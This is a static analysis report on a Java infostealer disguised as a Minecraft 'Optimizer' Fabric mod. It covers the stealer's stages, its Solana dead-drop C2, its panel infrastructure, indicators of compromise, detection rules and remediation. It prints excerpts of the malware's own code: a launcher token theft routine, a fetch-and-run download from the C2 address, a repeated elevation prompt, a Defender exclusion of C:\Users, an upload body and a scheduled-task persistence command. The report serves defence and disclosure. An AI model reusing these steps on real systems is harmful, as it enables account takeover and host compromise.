# Optimizer: Java infostealer delivered as a Minecraft Fabric mod

Static analysis of a two-stage Java stealer distributed as a Minecraft performance mod, including
the command and control panel it reports to.

| | |
|---|---|
| Report date | 2026-11-15 |
| Classification | Public |
| Analysis | Static, offline. No sample executed |
| Family | Java downloader and infostealer |
| Delivery | Fabric mod (`preLaunch` entrypoint) |
| Target | Minecraft players on Windows |
| Stage 0 | `optimizer_1794778622855.jar`, 4,565 bytes |
| Stage 1 | `st.jar`, 1,888,639 bytes |
| C2 | `31.59.106.34` (AS56971, Riga, LV) |
| Panel | `weedhack.lol`, API at `remote.weedhack.lol` |

## Summary

The sample is a Fabric mod that presents itself as a performance optimisation and contains no game
code. Its only behaviour is to collect Minecraft launcher account databases, retrieve a bundled Java
runtime and a second-stage jar over unencrypted HTTP, and execute the second stage under
`javaw.exe`.

The second stage resolves its command and control address from a Solana devnet transaction memo,
requests elevation through repeated consent prompts, adds a Windows Defender exclusion covering
`C:\Users`, downloads three Windows binaries, collects browser cookies, uploads the result as
base64-encoded JSON, and installs an `ONLOGON` scheduled task with `HIGHEST` privileges.

The command and control panel is operated at `weedhack.lol`, with an API-only endpoint at
`remote.weedhack.lol`. The malware itself contacts the origin address `31.59.106.34` directly and does
not reference either hostname; the association was established from a shared process identifier and
from the certificate presented by the origin.

Neither jar was executed during this analysis. The Windows components of the second stage were not
retrieved; statements about them are inferred from the invocation arguments and reported file sizes.
The source code produced by decompilation is included unmodified so that each claim can be verified.

## Sample set

| File | Role | Size | SHA-256 |
|---|---|---|---|
| `optimizer_1794778622855.jar` | Stage 0, Fabric mod | 4,565 | `e321c3cd6f9b8bb90ed8588960d47346a4b2bba29a28a60ed67a9418c562eb64` |
| `st.jar` | Stage 1, downloader and stealer | 1,888,639 | `8c4f0a9853af15d4a5fe67f2bbd6f36f67dbbc78e796130ffeeaa81cc2117c9e` |
| `jre.zip` | Adoptium JRE, `jdk-17.0.20.1+1-jre`, win x64 | 43,780,109 | `bc21a93923103cdaac93ee337b0ae4365e739fde36df823dd456bc67c8a9d352` |

MD5 values are recorded in `iocs/hashes.txt`. The Java runtime is an unmodified Adoptium build and
is not malicious; it is bundled so that the target host does not require a preinstalled JRE.

The loader's class file targets major version 65 (Java 21), consistent with a current Minecraft
runtime. `Payload.class` targets major version 61 (Java 17), consistent with the runtime that is
downloaded. The numeric component of the loader's filename is an epoch millisecond timestamp
corresponding to 2026-11-15 21:37 UTC; the `st.jar` entry timestamps correspond to 16:33 UTC the same
day. Both artefacts were therefore built on the date of analysis, which indicates an active
distribution rather than a resurfaced older sample.

The three Windows components were still being served at the time of analysis. Sizes were obtained
with HEAD requests and the files were not downloaded.

| Path | Bytes |
|---|---|
| `/api/downloads/AppCaller.exe` | 157,184 |
| `/api/downloads/caller.dll` | 74,240 |
| `/api/downloads/dllhost.exe` | 4,824,064 |

## Stage 0: Fabric mod

The archive contains `fabric.mod.json`, a manifest, and a single class.

```json
{
  "id": "optimizer",
  "name": "Optimizer",
  "description": "Performance improvements.",
  "authors": ["System"],
  "entrypoints": { "preLaunch": ["com.optimizer.OptimizerMod::init"] }
}
```

The `preLaunch` entrypoint executes before the game window is created, so the code runs whether or
not the user reaches a menu. The archive contains no mixins and no rendering code: a mod that claims
performance improvements while registering no game hooks cannot deliver them. The author field is
the generic string `System` and the contact block is empty.

`init()` starts a thread and performs three actions in sequence.

### Credential collection

`stealSsid()` runs first, before any network activity:

```java
File mc      = new File(System.getenv("APPDATA"), ".minecraft");
File lunar   = new File(appData, ".lunarclient\\settings\\game\\accounts.json");
File feather = new File(appData, ".feather\\accounts.json");
```

Every file present from the following set is concatenated into
`%LOCALAPPDATA%\Microsoft\AppBroker\output\ssid.txt`:

| File | Contents |
|---|---|
| `%APPDATA%\.minecraft\launcher_accounts.json` | Account entries including access and refresh tokens |
| `%APPDATA%\.minecraft\launcher_profiles.json` | Profile list, may contain legacy authentication data |
| `%APPDATA%\.lunarclient\settings\game\accounts.json` | Lunar Client account store |
| `%APPDATA%\.feather\accounts.json` | Feather Client account store |

These files contain session and refresh tokens rather than passwords. The collection therefore
supports account takeover without interaction with second-factor authentication, and a password
change does not necessarily invalidate a previously issued refresh token.

### Staging directory

`%LOCALAPPDATA%\Microsoft\AppBroker` is created as the working directory for the remaining stages.
The path does not correspond to any Microsoft component. It is placed alongside `Microsoft\Edge` and
`Microsoft\OneDrive` so that it appears consistent in a directory listing.

### Payload retrieval

```java
download("http://" + HOST + "/api/downloads/jre.zip", jreZip);
unzip(jreZip, jreDir);
jreZip.delete();
download("http://" + HOST + "/api/downloads/st.jar", stJar);
new ProcessBuilder(javaw, "-jar", stJar, KEY, HOST)
    .redirectOutput(DISCARD).redirectError(DISCARD).start();
```

`findJavaw()` searches the extracted tree recursively for `javaw.exe`, so the internal layout of the
archive is not significant. `javaw.exe` is used in preference to `java.exe` to avoid creating a
console window.

Both transfers use HTTP without TLS, signature verification, or hash verification, so the second
stage can be substituted by any party on the network path.

## Stage 1: `st.jar`

The archive contains `Payload.class` (18 KB, unobfuscated, `Main-Class: Payload`) and approximately
5.5 MB of JNA classes. The JNA package is not referenced from the constant pool of `Payload.class`
and appears to be unused, either retained from a development template or included as padding.

Two arguments are accepted, both with fallbacks:

```java
key  = args[0];
host = args[1];
if ((key.isEmpty() || key.equals("all")) && (k = readKeyFromJson()) != null) key = k;
if (host.isEmpty()) { while (host == null || host.isEmpty()) { host = getC2Ip(); sleep(30s); } }
```

`key.json` in the staging directory supplies the key if the argument is absent or equal to `all`.
The Solana lookup supplies the host if the argument is absent.

### C2 resolution

```java
SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
SOLANA_RPC    = "https://api.devnet.solana.com";
```

The payload calls `getSignaturesForAddress` with `limit: 10`, then `getTransaction` for each
signature, and extracts the address from the transaction memo by locating the literal `1(`, taking
the content up to the closing parenthesis, and requiring an IPv4 match. The wallet is on devnet,
where transaction costs are negligible, and the indirection allows the operator to change the C2
address without registering a domain that could be suspended. The payload contacts only the public
RPC endpoint and never the wallet itself.

Transactions present at the time of analysis:

| Memo | Timestamp (UTC) |
|---|---|
| `[15] 1(31.59.106.34)` | 2026-11-11 21:04 |
| `[17] 1(104.253.43.109)` | 2026-11-11 14:23 |
| `[17] 3(95.182.116.120)` | 2026-11-03 19:29 |
| `[15] 2(31.59.175.15)` | 2026-10-31 15:32 |
| `[16] 1(95.182.96.216)` | 2026-10-31 01:35 |

Two of these addresses were never used. The parser requires the literal `1(`, so the entries tagged
`2` and `3` are skipped without error. The bracketed value is likely a build or attempt counter. Two
further transactions carried no memo and are also skipped.

### Elevation

```java
return new File("C:\\Windows\\System32\\config").list() != null;
```

The administrative check is a directory listing. When it fails, the payload relaunches itself with
elevation in an unbounded loop at one attempt per second:

```powershell
Start-Process -FilePath '<jre>\bin\javaw.exe' -Verb RunAs `
  -ArgumentList '-jar "<st.jar>" <KEY> <HOST>' -WindowStyle Hidden
```

No user account control bypass is employed. The technique relies on the user approving a consent
prompt naming `javaw.exe`, which is plausible immediately after installing a mod, and on the prompt
recurring if it is declined.

A `.lock` file in the staging directory coordinates the two processes. The elevated child deletes it
at the start of `executePayload()` and the unelevated parent exits when it disappears.

### Defence evasion

```java
addExclusion(dir);
Thread.sleep(10_000);
```

Two attempts are made, both through hidden PowerShell:

```powershell
Add-MpPreference -ExclusionPath 'C:\Users', '<AppBroker>' -ErrorAction Stop
```

If that fails or returns no output, an inline C# assembly compiled with `Add-Type` calls the WMI
provider `MSFT_MpPreference.Add` with the same two paths. The exclusion of `C:\Users` removes
Defender coverage from every user profile on the host and is not consistent with a false-positive
allowance. The ten second delay allows the policy to take effect before the next download.

Both attempts, including the captured PowerShell output, are written to `error.log` in the staging
directory. This file records the exclusion result, the registration response, the assigned
`clientId`, and each upload attempt, and should be preserved during response.

### Registration

```json
{"cmd":"ping_ip","key":"<KEY>","hostname":"<COMPUTERNAME>","ip":"<public IP>"}
```

The request is a POST to `http://<C2>/api/rpc`. The external address is obtained from
`https://api.ipify.org`. The response is parsed for `"clientId":` and the value is stored in
`client_id.txt`, giving the operator a persistent identifier per host.

### Second stage

```java
new ProcessBuilder("cmd.exe", "/c", "AppCaller.exe all").directory(dir).start();
Thread.sleep(30_000);
new ProcessBuilder("cmd.exe", "/c", "dllhost.exe " + key).directory(dir).start();
```

The three Windows files are downloaded into the staging directory and executed from there. Both
launches are conditional on the file exceeding 1 KB, a minimal check that the server returned a file
rather than an error page.

`AppCaller.exe` and `caller.dll` appear to form the collection component; the `all` argument suggests
a collection mode covering every supported source. Output is expected in `output\` and `cookies\`.
`dllhost.exe` uses the name of a Windows system process and is passed the licence key, which
indicates that it authenticates to the panel independently.

### Collection and exfiltration

After a further delay, `output\` and `cookies\` are archived to `capture.zip` and submitted as
base64 within a JSON body:

```json
{"cmd":"upload","key":"...","clientId":0,"hostname":"...","realIp":"...",
 "name":"capture.zip","data":"<base64>"}
```

Five attempts are made at five second intervals; the transfer is treated as complete when the
response contains `"ok":true`. `capture.zip`, `output\` and `cookies\` are then deleted, so a
responder should expect the downloaded binaries, `key.json`, `client_id.txt`, `error.log` and
`.lock`, but not the collected data.

### Persistence

```
schtasks.exe /Create /TN WindowsJavaHelper /TR "<jre>\bin\javaw.exe -jar <AppBroker>\st.jar <KEY> <HOST>" /SC ONLOGON /RL HIGHEST /F
```

`ONLOGON` combined with `HIGHEST` restores execution at each logon with administrative rights and
without a consent prompt, so the elevation loop only has to be satisfied once. The task name is
consistent with a Java runtime component and is unlikely to attract attention in a task listing.

## Command and control panel

The C2 host was examined with unauthenticated GET requests to public paths only. No authentication
was attempted and no endpoint returning victim data was accessed.

Every path outside `/api` returns:

```json
{"error":"not found — S2 is API only"}
```

The panel is named S2. On the origin address and on `remote.weedhack.lol` the service exposes no web
front end at all, and the custom 404 states that directly. The admin interface exists only on the
main domain, which is covered under [Domain infrastructure](#domain-infrastructure).

`/api/health` requires no authentication:

```json
{"ok":true,"uptime":19108,"http":80,"tcp":443,"udp":880,"time":"2026-11-15T21:52:05.650Z"}
```

Uptime of approximately 5.3 hours at the time of the request indicates frequent redeployment. The
three numeric fields appear to report the ports the service expects to be reachable on.

Response headers are the default `helmet` set (`Cross-Origin-Opener-Policy: same-origin`,
`Origin-Agent-Cluster: ?1`, `X-DNS-Prefetch-Control: off`, `X-XSS-Protection: 0`) together with
`express-rate-limit` version 7 headers:

```
RateLimit-Policy: 600;w=60
RateLimit-Limit: 600
RateLimit-Remaining: 513
RateLimit-Reset: 15
```

The service is therefore Node.js with Express, exposed without a reverse proxy and without a
`Server` header, with a single global rate limit bucket of 600 requests per minute.

Paths that do not exist return 404. The following return 401, which establishes that they exist and
are protected:

```
GET /api/clients        401 {"error":"unauthorized"}
GET /api/clients/list   401 {"error":"unauthorized"}
GET /api/builds         401 {"error":"unauthorized"}
GET /api/me             401 {"error":"unauthorized"}
```

A client list and a build list are therefore present behind authentication, consistent with the
`clientId` value recorded by the malware. No `WWW-Authenticate` header is returned, indicating a
bearer token or custom header rather than HTTP basic authentication. The following paths were also
tested and do not exist: `/api/login`, `/api/auth`, `/api/token`, `/api/users`, `/api/stats`,
`/api/config`, `/api/keys`, `/api/logs`, `/api/metrics`, `/api/docs`, `/api/openapi.json`.

No further interaction was performed. Path enumeration against a public service is sufficient to
characterise it; attempts against the authentication mechanism of a host holding third-party
credentials would constitute unauthorised access and would also compromise the evidential value of
the host for any subsequent investigation. Removal should be pursued through the hosting provider.
`takedown/abuse-report.md` is a prepared report for `abuse@cloudbackbone.net` containing the
evidence, file hashes and endpoint list required for a suspension request. `takedown/registrar-email.md`
covers the registrar of record, HOSTINGER operations, UAB, which can suspend the domain and preserve
registration and account records for law enforcement.

## Domain infrastructure

The malware does not reference a domain. It contacts `31.59.106.34` directly, which is why the origin
exposes port 80 without a proxy in front of it. The operator's panel is nevertheless reachable by
name, and the following hostnames were confirmed to resolve to the same backend.

| Hostname | Resolves to | Role |
|---|---|---|
| `weedhack.lol` | `104.21.51.153`, `172.67.182.22` (Cloudflare) | Site and admin panel |
| `remote.weedhack.lol` | same | API only |
| `31.59.106.34` | origin | API only, contacted directly by the malware |

### Attribution to the origin

A domain resolving through Cloudflare does not by itself identify the server behind it, so three
independent observations were used.

First, the health endpoint returns a monotonic uptime counter that identifies the process. Readings
taken across all three hostnames continue a single sequence:

| Time (UTC) | Host | Uptime |
|---|---|---|
| 21:52:05.650 | `31.59.106.34` | 19108 |
| 22:00:02.921 | `weedhack.lol` | 19585 |
| 22:00:03.989 | `remote.weedhack.lol` | 19586 |
| 22:00:57.677 | `31.59.106.34` | 19640 |

The elapsed wall clock between the first and last reading is 532.027 seconds and the uptime
difference is 532 seconds. The counter is uninterrupted across all three hostnames, so the same
process serves them.

Second, the origin presents a self-signed certificate whose subject is `CN=weedhack`:

```
subject = CN=weedhack
issuer  = CN=weedhack
notBefore = Nov 11 14:16:02 2026 GMT
notAfter  = Nov 11 14:16:02 2027 GMT
```

The certificate on the origin is named for the domain, which ties the address to the operator
independently of DNS. Cloudflare holds a separate Let's Encrypt certificate for `weedhack.lol`, issued
2026-11-09 20:57 UTC, one day after the domain was registered.

Third, response behaviour is consistent across the hostnames. `/api/clients` and `/api/builds`
return 401 on all three, and the JSON error bodies are identical.

### Domain registration

```
Domain      weedhack.lol
Registered  2026-11-08 22:22:28 UTC
Expires     2027-11-08 23:59:59 UTC
Registrar   HOSTINGER operations, UAB
Status      clientTransferProhibited, serverTransferProhibited
Nameservers brit.ns.cloudflare.com, gabriel.ns.cloudflare.com
Last changed 2026-11-13 22:24:37 UTC
```

The domain was registered seven days before this analysis and three days before the current C2
address was published through the dead drop. The sequence is consistent with a campaign that
provisioned new infrastructure in the same week: domain on 2026-11-08, edge certificate on
2026-11-09, origin certificate on 2026-11-11 14:16, C2 pointer published 2026-11-11 21:04, both
artefacts rebuilt 2026-11-15.

### Panel interface

`https://weedhack.lol/admin` returns HTTP 200 and an HTML login page titled `Admin Portal`, with
headings `Admin login` and `Premium Manager`. No credentials were submitted and no authentication was
attempted. The page title and headings were read from the unauthenticated response only.

`https://weedhack.lol/` returns HTTP 403 from Cloudflare with the interstitial title
`Suspected Malware | Cloudflare`. Cloudflare has therefore already classified the domain as
malicious, which corroborates the findings in this report from an independent source. The site
content behind that block was not retrieved and is not characterised here.

`https://remote.weedhack.lol/` returns the default Express 404 (`Cannot GET /`) with
`x-powered-by: Express` present, and does not serve an admin interface. This is consistent with the
`S2 is API only` message returned by the origin for non-API paths.

One difference was observed and is recorded without interpretation: a GET to `/api/rpc` returns 401
on `weedhack.lol` but 404 on `remote.weedhack.lol` and on the origin, while `/api/clients` and
`/api/builds` return 401 on all three. The endpoint is used with POST by the malware, so the GET
behaviour is not indicative of its normal operation.

## Indicators of compromise

### Host

| Type | Value |
|---|---|
| Directory | `%LOCALAPPDATA%\Microsoft\AppBroker\` |
| Persisted files | `st.jar`, `jre\**\bin\javaw.exe`, `key.json`, `client_id.txt`, `error.log`, `.lock` |
| Transient files | `jre.zip`, `capture.zip`, `output\`, `cookies\` |
| Second stage | `AppCaller.exe`, `caller.dll`, `dllhost.exe` |
| Scheduled task | `WindowsJavaHelper`, `ONLOGON`, `HIGHEST` |
| Mod | `optimizer_<epoch_ms>.jar`, id `optimizer`, entrypoint `com.optimizer.OptimizerMod::init` |

### Command lines

```
javaw.exe -jar ...\Microsoft\AppBroker\st.jar <KEY> <HOST>
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Start-Process ... -Verb RunAs ...
powershell.exe ... Add-MpPreference -ExclusionPath 'C:\Users', '...\AppBroker'
powershell.exe ... Add-Type ... MSFT_MpPreference ...
cmd.exe /c AppCaller.exe all
cmd.exe /c dllhost.exe <KEY>
schtasks.exe /Create /TN WindowsJavaHelper ... /SC ONLOGON /RL HIGHEST /F
```

### Network

| Type | Value |
|---|---|
| C2 | `hxxp://31[.]59[.]106[.]34` (AS56971 CloudBackbone, Riga, LV) |
| Panel domain | `weedhack[.]lol` (Cloudflare: `104[.]21[.]51[.]153`, `172[.]67[.]182[.]22`) |
| API domain | `remote[.]weedhack[.]lol` (same addresses) |
| Origin certificate | self-signed, `CN=weedhack`, valid 2026-11-11 to 2027-11-11 |
| Registrar | HOSTINGER operations, UAB |
| Prior C2 | `104[.]253[.]43[.]109` (AS211273, Riga), `95[.]182[.]96[.]216` (AS56971, Paris), `31[.]59[.]175[.]15` (AS56971, Amsterdam), `95[.]182[.]116[.]120` (AS56971, Paris) |
| Endpoints | `/api/downloads/{jre.zip,st.jar,AppCaller.exe,caller.dll,dllhost.exe}`, `/api/rpc` |
| Dead drop | Solana devnet `BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV` via `api.devnet.solana.com` |
| External address lookup | `https://api.ipify.org` |
| User agent | `Mozilla/5.0` on every request |

The licence key `9THN-RSS9-G92S-CRPB` is embedded in the loader and passed as the first argument to
every child process. It identifies the operator's subscription rather than an individual victim and
is shared by all copies of this build.

## Detection

Distribution channels: a `preLaunch` or `preLaunchClient` entrypoint that references
`ProcessBuilder`, network APIs, or launcher account files warrants inspection. A mod that claims
performance improvements and registers no mixins should be treated as misrepresented regardless of
its other contents.

Host-based signals, in descending order of value:

- Process creation from `%LOCALAPPDATA%\Microsoft\AppBroker`, or any executable or JAR under a
  `Microsoft\*` path within `%LOCALAPPDATA%`
- `javaw.exe -jar` with an archive path under AppData and redirected output
- `Add-MpPreference` with an `ExclusionPath` under `C:\Users`, and any `MSFT_MpPreference` WMI call
- Creation of a scheduled task named `WindowsJavaHelper` with `/RL HIGHEST /SC ONLOGON`
- Repeated elevation prompts from a non-Microsoft `javaw.exe`

Network signals: POST bodies containing a large base64 `data` field directed to `/api/rpc` on a bare
address, name resolution of `api.devnet.solana.com` originating from a JVM process, and DNS or proxy
records for `weedhack.lol` and its subdomains.

### YARA

Rules are in `yara/optimizer_stealer.yar`. Both archives are zip containers, so every string is
compressed at rest and the rules will not match the JAR files themselves. Extract first and scan the
class files, or scan process memory:

```
unzip -o st.jar -d /tmp/st && yara -r optimizer_stealer.yar /tmp/st
```

The rules were compiled and verified to match `OptimizerMod.class` and `Payload.class`, and to
produce no match on `st.jar`, the loader JAR, or a stock JDK `modules` image.

### Sigma

`sigma/optimizer_stealer.yml` contains two rules, one covering the host artefacts and one covering
the network pattern.

## Design weaknesses

The following implementation defects are relevant to both hunting and attribution.

The `.lock` handshake is unreliable. If the elevated child terminates before deleting the file, the
parent removes it and elevates again, which restarts the prompt loop rather than terminating.

The C2 address is resolved from the dead drop only when the argument is empty. The dropper always
supplies `HOST` on the command line and the scheduled task embeds it, so rotation does not reach an
established infection. Hosts remain bound to the address that was current at installation, which
makes superseded addresses durable indicators.

Response parsing for `clientId` uses `indexOf` with `}` and `,` fallbacks. Any change to the panel's
response structure breaks it silently and results in `clientId: 0`.

`isAdmin()` infers elevation from a directory listing. On hosts where
`C:\Windows\System32\config` is unreadable for unrelated reasons, the check fails and the prompt loop
repeats without purpose.

The sample contains no anti-analysis measures: no virtual machine or sandbox detection, no timing
checks, and no obfuscation. It executes to completion in any Windows virtual machine with a Java
runtime.

Operational security weaknesses are consistent with a small operation: unencrypted HTTP for all
transfers including exfiltration, a single licence key shared across builds, verbose logs retained
on disk, a JSON 404 at the panel root, and payload downloads served from the same host as the API.

Dead drop activity spans 2026-10-31 to 2026-11-11 and both artefacts were rebuilt on 2026-11-15,
indicating continuing development.

## Method

Both archives were extracted and hashed. Class file versions were read with `javap` and constant
pools examined with `strings`. Decompilation was performed with CFR 0.152. The sources under `src/`
are the unmodified decompiler output.

Infrastructure characterisation consisted of one HEAD request per download endpoint to confirm
availability and obtain sizes, a public read of the Solana devnet account, and ASN and geolocation
lookups. No second-stage binary was retrieved and no sample was executed.

## Remediation

Invalidate the Minecraft and Microsoft session tokens. A password change alone does not necessarily
revoke an issued refresh token. Then remove the `WindowsJavaHelper` scheduled task, delete
`%LOCALAPPDATA%\Microsoft\AppBroker`, and remove any Defender exclusion covering `C:\Users` or a path
under that directory. Preserve `error.log` before deletion; it records the assigned `clientId` and the
C2 interaction history.

## Appendix: repository layout

```
README.md                                    this report
src/loader/com/optimizer/OptimizerMod.java   stage 0, CFR 0.152 output
src/payload/Payload.java                     stage 1, CFR 0.152 output
iocs/hashes.txt                              hashes, stage 2 sizes, wallet, licence key
yara/optimizer_stealer.yar                   3 rules, verified against the samples
sigma/optimizer_stealer.yml                  2 rules, host and network
takedown/abuse-report.md                     report for the hosting provider
takedown/registrar-email.md                  report for the domain registrar
```
